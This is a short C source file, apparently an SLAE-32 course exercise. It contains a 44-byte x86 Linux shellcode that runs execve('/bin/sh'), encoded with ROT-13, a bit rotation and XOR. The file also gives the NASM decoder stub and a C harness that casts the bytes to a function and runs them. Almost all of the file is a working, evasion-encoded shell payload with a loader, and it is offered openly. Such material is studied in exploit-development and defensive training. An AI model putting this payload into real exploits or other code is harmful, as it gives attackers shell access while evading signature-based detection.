/*
; Title     : Execve /bin/sh Shellcode encoded with ROT-13 + RShift-2 + XOR
; Date      : April, 2018
; Author    : Nuno Freitas
; Blog Post : https://bufferoverflowed.wordpress.com/slae32/slae-32-shellcode-encoder/
; Twitter   : @nunof11
; SLAE ID   : SLAE-1112
; Size      : 44 bytes
; Tested on : i686 GNU/Linux

NASM:

section .text

global _start

_start:
  jmp short call_decoder

decoder:
  pop esi ; pop the Shellcode address from the Stack
  xor ecx, ecx
  mov cl, shellcodelen ; Set the loop counter to shellcodelen

decode:
  rol byte [esi], 0x2 ; Left Shift 2
  xor byte [esi], cl  ; XOR the byte with the ecx (counter)
  sub byte [esi], 13  ; Undo ROT13

  inc esi ; increment the offset (iterate over the bytes)
  loop decode ; loop while zero flag not set

  jmp short Shellcode

call_decoder:
  call decoder ; Shellcode address will be pushed into the Stack
  Shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23
  shellcodelen  equ  $-Shellcode

*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\xeb\x12\x5e\x31\xc9\xb1\x13\xc0\x06\x02\x30\x0e\x80\x2e\x0d\x46\xe2\xf5\xeb\x05\xe8\xe9\xff\xff\xff\x4b\xf7\x13\x59\xcc\x8c\x63\x5e\x9f\x8d\x99\x9f\x1f\xa4\x3b\x6e\xc6\x36\x23";

void main()
{
    printf("Shellcode Length:  %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())shellcode;
    ret();
}